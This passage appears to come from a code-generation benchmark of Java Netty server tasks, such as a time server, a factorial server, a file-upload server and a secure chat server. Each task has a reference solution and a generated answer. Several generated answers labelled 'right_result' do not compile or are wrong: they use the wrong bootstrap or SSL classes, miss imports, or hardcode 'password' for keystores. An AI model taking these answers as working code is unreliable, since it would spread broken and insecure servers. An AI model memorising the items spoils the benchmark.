    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\n\npublic class TimeServer {\n    private int port;\n\n    public TimeServer(int port) {\n        this.port = port;\n    }\n\n    public void run() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .childHandler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ch.pipeline().addLast(new StringDecoder());\n                             ch.pipeline().addLast(new StringEncoder());\n                             ch.pipeline().addLast(new TimeServerHandler());\n                         }\n                     })\n                     .childOption(ChannelOption.SO_REUSEADDR, true)\n                     .option(ChannelOption.SO_BACKLOG, 100);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        new TimeServer(port).run();\n    }\n\n    static class TimeServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            String currentTime = new java.util.Date().toString();\n            ctx.write(currentTime);\n            ctx.flush();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 214,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: FactorialServer is a Netty-based TCP server that listens on a specified port for incoming client connections. It supports optional SSL encryption and uses a boss-worker thread model for efficient connection handling. The server remains active until explicitly shut down, gracefully releasing all resources upon termination.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- main: [main(String[] args)] -> [void] - Entry point that initializes and starts the server. Handles SSL configuration if enabled, sets up event loop groups, configures server bootstrap, and manages server lifecycle.\n  - Input: String[] args - Command line arguments\n  - Output: void",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class FactorialServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new FactorialServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.SimpleChannelInboundHandler;\n\npublic class FactorialServer {\n    private final boolean ssl;\n    private final int port;\n    private SslContext sslCtx;\n\n    public FactorialServer(boolean ssl, int port) {\n        this.ssl = ssl;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            sslCtx = ssl ? SslContext.newClientContext() : null;\n\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ch.pipeline().addLast(new StringDecoder());\n                     ch.pipeline().addLast(new StringEncoder());\n                     ch.pipeline().addLast(new FactorialServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_REUSEADDR, true);\n\n            if (ssl) {\n                b.handler(new SslHandler(sslCtx));\n            } else {\n                b.handler(new LoggingHandler(LogLevel.INFO));\n            }\n\n            ChannelFuture future = b.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = 8080;\n        boolean ssl = false;\n\n        if (args.length > 0) {\n            if (args[0].equals(\"--ssl\") || args[0].equals(\"-ssl\")) {\n                ssl = true;\n                if (args.length > 1) {\n                    port = Integer.parseInt(args[1]);\n                }\n            } else {\n                port = Integer.parseInt(args[0]);\n            }\n        }\n\n        FactorialServer server = new FactorialServer(ssl, port);\n        try {\n            server.run();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass FactorialServerHandler extends SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n        String response = \"Response: \" + msg; // Placeholder\n        ctx.writeAndFlush(response);\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}"
  },
  {
    "Task_id": 215,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP file uploads, with optional SSL support for secure connections.\n\nClass Description: HttpUploadServer is a Netty-based server that listens for incoming HTTP connections and handles file upload requests. It supports both secure (HTTPS) and non-secure (HTTP) connections, configurable via system properties.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL should be enabled (read from system property \"ssl\")\n- PORT: int - The port number the server will listen on (read from system property \"port\", defaults to 8443 for SSL or 8080 for non-SSL)\n\nMethods:\n- main(String[] args) -> void - Entry point of the application that sets up and runs the Netty server\n  - args: String[] - Command line arguments (not directly used)\n  - return: void\n\nThe method performs the following operations:\n1. Configures SSL context if SSL is enabled\n2. Creates event loop groups for handling connections\n3. Sets up server bootstrap with channel type and handlers\n4. Binds to the specified port and starts the server\n5. Keeps the server running until shutdown\n6. Cleans up resources on shutdown",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpUploadServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup);\n            b.channel(NioServerSocketChannel.class);\n            b.handler(new LoggingHandler(LogLevel.INFO));\n            b.childHandler(new HttpUploadServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*; import io.netty.channel.epoll.EpollEventLoopGroup; import io.netty.channel.nio.NioEventLoopGroup; import io.netty.channel.socket.SocketChannel; import io.netty.channel.socket.nio.NioServerSocketChannel; import io.netty.handler.codec.http.*; import io.netty.handler.logging.LogLevel; import io.netty.handler.logging.LoggingHandler; import io.netty.handler.ssl.SslContext; import io.netty.handler.ssl.SslHandler; import io.netty.handler.ssl.SslServerContext; import io.netty.handler.ssl.SslServerContextBuilder; import io.netty.handler.ssl.TrustManagerFactory; import io.netty.handler.ssl.X509KeyManager; import io.netty.handler.ssl.X509TrustManager; import java.io.File; import java.io.FileOutputStream; import java.io.IOException; import java.util.concurrent.atomic.AtomicBoolean; public class HttpUploadServer { public static void main(String[] args) { boolean ssl = Boolean.getBoolean(\"ssl\"); int port = Integer.getInteger(\"port\", ssl ? 8443 : 8080); EventLoopGroup bossGroup = new NioEventLoopGroup(1); EventLoopGroup workerGroup = new NioEventLoopGroup(); try { ServerBootstrap b = new ServerBootstrap(); b.group(bossGroup, workerGroup); b.channel(NioServerSocketChannel.class); if (ssl) { SslContext sslCtx = SslServerContextBuilder.forServer(\"path/to/keystore.jks\", \"password\", \"truststore.jks\", \"trustpassword\") .keyManager(X509KeyManager.class) .trustManager(X509TrustManager.class) .build(); b.handler(new ChannelInitializer<SocketChannel>() { @Override protected void initChannel(SocketChannel ch) throws Exception { ChannelPipeline p = ch.pipeline(); p.addLast(new SslHandler(sslCtx)); p.addLast(new HttpServerCodec()); p.addLast(new HttpObjectAggregator(65536)); p.addLast(new HttpUploadServerHandler()); } }); } else { b.handler(new ChannelInitializer<SocketChannel>() { @Override protected void initChannel(SocketChannel ch) throws Exception { ChannelPipeline p = ch.pipeline(); p.addLast(new HttpServerCodec()); p.addLast(new HttpObjectAggregator(65536)); p.addLast(new HttpUploadServerHandler()); } }); } ChannelFuture future = b.bind(port).sync(); future.channel().closeFuture().sync(); } finally { bossGroup.shutdownGracefully(); workerGroup.shutdownGracefully(); } } static class HttpUploadServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> { private static final String FILE_NAME = \"uploaded_file\"; @Override protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) { if (!request.method().equals(HttpMethod.POST)) { sendError(ctx, HttpResponseStatus.BAD_REQUEST); return; } String contentType = request.headers().get(\"Content-Type\"); if (contentType == null || !contentType.contains(\"multipart/form-data\")) { sendError(ctx, HttpResponseStatus.BAD_REQUEST); return; } try { File file = new File(\"uploads/\" + FILE_NAME); FileOutputStream fos = new FileOutputStream(file); fos.write(request.content().array()); fos.close(); FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK); response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain\"); response.content().writeBytes(\"File uploaded successfully.\".getBytes()); ctx.writeAndFlush(response); } catch (Exception e) { sendError(ctx, HttpResponseStatus.INTERNAL_SERVER_ERROR); } } private void sendError(ChannelHandlerContext ctx, HttpResponseStatus status) { FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status); response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain\"); response.content().writeBytes(status.toString().getBytes()); ctx.writeAndFlush(response).addListener((ChannelFutureListener) future -> { future.channel().close(); }); } } }"
  },
  {
    "Task_id": 216,
    "Instruction": "Task Description: Create a Java class that implements an HTTP test server using Netty framework to handle incoming HTTP requests, process them with a custom handler, and return appropriate responses.\n\nClass Description: HttpTestServer is a Netty-based HTTP server designed for testing purposes. It handles incoming HTTP requests, processes them using a customizable request handler, and returns JSON responses. The server can be configured to simulate failures and include custom headers in responses.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- fail: boolean - Flag to determine if server should respond with failure status\n- requestHandler: BiConsumer<HttpRequest, JsonGenerator> - Custom handler for processing requests and generating JSON responses\n- headers: Map<String, String> - Optional custom headers to include in responses\n- channel: Channel - Netty channel for server communication\n- group: NioEventLoopGroup - Netty event loop group for handling I/O operations\n- responses: List<String> - Stores all generated responses for testing purposes\n- JSON_FACTORY: JsonFactory - Static Jackson JSON factory for JSON processing\n\nMethods:\n- HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler, Map<String, String> headers) - Constructor with all parameters\n- HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler) - Constructor without headers parameter\n- run() -> void - Starts the server and binds it to the specified port\n- boundPort() -> int - Returns the actual port the server is bound to\n- shutDown() -> void - Gracefully shuts down the server and releases resources\n- HttpTestServerHandler (inner class) - Handles incoming HTTP requests and generates responses",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.function.BiConsumer;\n\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\nimport org.jetbrains.annotations.Nullable;\n\nimport com.fasterxml.jackson.core.JsonEncoding;\nimport com.fasterxml.jackson.core.JsonFactory;\nimport com.fasterxml.jackson.core.JsonGenerator;\nimport com.fasterxml.jackson.core.JsonParser;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.EmptyHttpHeaders;\nimport io.netty.handler.codec.http.HttpContentCompressor;\nimport io.netty.handler.codec.http.HttpHeaders;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.util.ReferenceCountUtil;\n\npublic class HttpTestServer {\n\n    private final int port;\n    private final boolean fail;\n    private final BiConsumer<HttpRequest, JsonGenerator> requestHandler;\n    private static final JsonFactory JSON_FACTORY;\n    private Channel channel;\n    private NioEventLoopGroup group;\n    public List<String> responses = new ArrayList<>();\n    @Nullable\n    private final Map<String, String> headers;\n\n    static {\n        JSON_FACTORY = new JsonFactory();\n        JSON_FACTORY.configure(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES, true);\n        JSON_FACTORY.configure(JsonGenerator.Feature.QUOTE_FIELD_NAMES, true);\n        JSON_FACTORY.configure(JsonParser.Feature.ALLOW_COMMENTS, true);\n    }\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler, @Nullable Map<String, String> headers) {\n        this.port = port;\n        this.fail = fail;\n        this.requestHandler = requestHandler;\n        this.headers = headers;\n    }\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler) {\n        this(port, fail, requestHandler, null);\n    }\n\n    public void run() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        group = new NioEventLoopGroup();\n        bootstrap.group(group);\n        bootstrap.channel(NioServerSocketChannel.class);\n        bootstrap.childHandler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(\"decoder\", new HttpRequestDecoder());\n                pipeline.addLast(\"encoder\", new HttpResponseEncoder());\n                pipeline.addLast(\"deflater\", new HttpContentCompressor());\n                pipeline.addLast(\"handler\", new HttpTestServerHandler());\n            }\n        });\n        channel = bootstrap.bind(new InetSocketAddress(port)).sync().channel();\n    }\n\n    public int boundPort() {\n        InetSocketAddress localAddress = (InetSocketAddress) channel.localAddress();\n        return localAddress.getPort();\n    }\n\n    public void shutDown() {\n        channel.close().awaitUninterruptibly();\n        if (group != null) {\n            group.shutdownGracefully().awaitUninterruptibly();\n            group.terminationFuture().awaitUninterruptibly();\n            group = null;\n        }\n    }\n\n    @ChannelHandler.Sharable\n    public class HttpTestServerHandler extends SimpleChannelInboundHandler<Object> {\n        private final Logger logger = LogManager.getLogger(HttpTestServerHandler.class.getName());\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (!(msg instanceof HttpRequest)) {\n                ctx.fireChannelRead(msg);\n                return;\n            }\n            try {\n                handleHttpRequest(ctx, (HttpRequest) msg);\n            } finally {\n                ReferenceCountUtil.release(msg);\n            }\n        }\n\n        private void handleHttpRequest(ChannelHandlerContext ctx, HttpRequest msg) throws UnsupportedEncodingException {\n            String uri = msg.uri();\n            logger.debug(\"Got Request for \" + uri);\n            HttpResponseStatus status = fail ? HttpResponseStatus.BAD_REQUEST : HttpResponseStatus.OK;\n            ByteArrayOutputStream out = new ByteArrayOutputStream();\n            try {\n                JsonGenerator generator = JSON_FACTORY.createGenerator(out, JsonEncoding.UTF8);\n                requestHandler.accept(msg, generator);\n            } catch (Exception ex) {\n                status = HttpResponseStatus.INTERNAL_SERVER_ERROR;\n            }\n            ByteBuf byteBuf = Unpooled.wrappedBuffer(out.toByteArray());\n            responses.add(out.toString(StandardCharsets.UTF_8));\n\n            DefaultFullHttpResponse response;\n            if (headers != null && headers.isEmpty() == false) {\n                HttpHeaders httpHeaders = new DefaultHttpHeaders();\n                for (var entries : headers.entrySet()) {\n                    httpHeaders.add(entries.getKey(), entries.getValue());\n                }\n                response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, byteBuf, httpHeaders, EmptyHttpHeaders.INSTANCE);\n            } else {\n                response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, byteBuf);\n            }\n\n            ChannelFuture future = ctx.channel().writeAndFlush(response);\n            future.addListener(ChannelFutureListener.CLOSE);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            logger.warn(\"Unexpected exception from downstream.\", cause);\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport com.fasterxml.jackson.core.JsonFactory;\nimport com.fasterxml.jackson.core.JsonGenerator;\nimport java.util.Map;\nimport java.util.List;\nimport java.util.ArrayList;\nimport java.util.concurrent.TimeUnit;\nimport java.nio.charset.Charset;\n\npublic class HttpTestServer {\n    private final int port;\n    private final boolean fail;\n    private final BiConsumer<HttpRequest, JsonGenerator> requestHandler;\n    private final Map<String, String> headers;\n    private Channel channel;\n    private EventLoopGroup group;\n    private final List<String> responses = new ArrayList<>();\n    private static final JsonFactory JSON_FACTORY = new JsonFactory();\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler, Map<String, String> headers) {\n        this.port = port;\n        this.fail = fail;\n        this.requestHandler = requestHandler;\n        this.headers = headers;\n    }\n\n    public HttpTestServer(int port, boolean fail, BiConsumer<HttpRequest, JsonGenerator> requestHandler) {\n        this(port, fail, requestHandler, null);\n    }\n\n    public void run() {\n        group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                 .channel(NioServerSocketChannel.class)\n                 .childOption(ChannelOption.SO_REUSEADDR, true)\n                 .childOption(ChannelOption.AUTO_READ, true)\n                 .childHandler(new ChannelInitializer<Channel>() {\n                     @Override\n                     protected void initChannel(Channel ch) {\n                         ch.pipeline().addLast(new HttpTestServerHandler(HttpTestServer.this));\n                     }\n                 })\n                 .bind(port).sync();\n        channel = bootstrap.channel();\n    }\n\n    public int boundPort() {\n        return port;\n    }\n\n    public void shutDown() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public class HttpTestServerHandler extends ChannelInboundHandlerAdapter {\n        private final HttpTestServer server;\n\n        public HttpTestServerHandler(HttpTestServer server) {\n            this.server = server;\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof HttpRequest) {\n                HttpRequest request = (HttpRequest) msg;\n                ByteBuf content = ctx.alloc().buffer();\n                try (JsonGenerator gen = JSON_FACTORY.createJsonGenerator(content)) {\n                    server.requestHandler.accept(request, gen);\n                } catch (Exception e) {\n                    // Handle exception, maybe log\n                }\n                int status = server.fail ? HttpResponseStatus.INTERNAL_SERVER_ERROR.code() : HttpResponseStatus.OK.code();\n                FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.valueOf(status), content);\n                for (Map.Entry<String, String> entry : server.headers.entrySet()) {\n                    response.headers().set(entry.getKey(), entry.getValue());\n                }\n                server.responses.add(response.content().toString(Charset.defaultCharset()));\n                ctx.writeAndFlush(response);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 218,
    "Instruction": "Task Description: Create a Java class that implements a secure TCP chat server using Netty framework, supporting SSL/TLS encryption for secure communication between clients and the server.\n\nClass Description: SecureChatServer is a Netty-based TCP server that handles secure chat communications. It initializes SSL context, configures server bootstrap with event loop groups, and manages server lifecycle including graceful shutdown.\n\nAttributes:\nPORT: int - The port number on which the server listens for incoming connections (default: 8992)\nsslCtx: SslContext - The SSL context used for secure communication\nbossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\nworkerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n\nMethods:\nmain: main(String[] args) -> void - Entry point that initializes SSL context, configures server, binds to port, and manages server lifecycle\n    - args: String[] - Command line arguments (unused in this implementation)\n    - No explicit return value (void)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class SecureChatServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public static void main(String[] args) throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n            .build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SecureChatServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport java.io.FileInputStream;\nimport java.security.KeyStore;\nimport java.security.KeyManagerFactory;\nimport java.security.TrustManagerFactory;\nimport java.security.KeyStoreException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.UnrecoverableKeyException;\nimport java.security.cert.CertificateException;\n\npublic class SecureChatServer {\n    private static final int PORT = 8992;\n    private SslContext sslCtx;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public static void main(String[] args) {\n        try {\n            KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n            keyStore.load(new FileInputStream(\"server.keystore\"), \"password\".toCharArray());\n            KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());\n            keyManagerFactory.init(keyStore, \"password\".toCharArray());\n\n            KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType());\n            trustStore.load(new FileInputStream(\"truststore.jks\"), \"password\".toCharArray());\n            TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n            trustManagerFactory.init(trustStore);\n\n            sslCtx = new SslContextBuilder()\n                    .protocol(Protocol.TLS)\n                    .keyManager(keyManagerFactory)\n                    .trustManager(trustManagerFactory)\n                    .build();\n\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup();\n\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(sslCtx.newHandler(ch.alloc()));\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new ChatServerHandler());\n                 }\n             })\n             .childOption(ChannelOption.SO_REUSEADDR, true)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = b.bind(PORT).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n            System.exit(1);\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 220,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: The FactorialServer class is a Netty-based TCP server that listens for incoming client connections on a specified port. It supports both plain and SSL-encrypted connections, and uses a separate initializer class to configure the channel pipeline for request processing.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be enabled\n- PORT: int - The port number on which the server will listen for connections\n\nMethods:\n- start(): void - Starts the Netty TCP server with the configured settings. Handles server initialization, binding to the specified port, and proper resource cleanup on shutdown. Throws Exception if any error occurs during server startup.\n\nInput: None (Configuration is done through system properties: \"ssl\" for enabling SSL and \"port\" for specifying the server port)\n\nOutput: None (The server runs continuously until shutdown)",
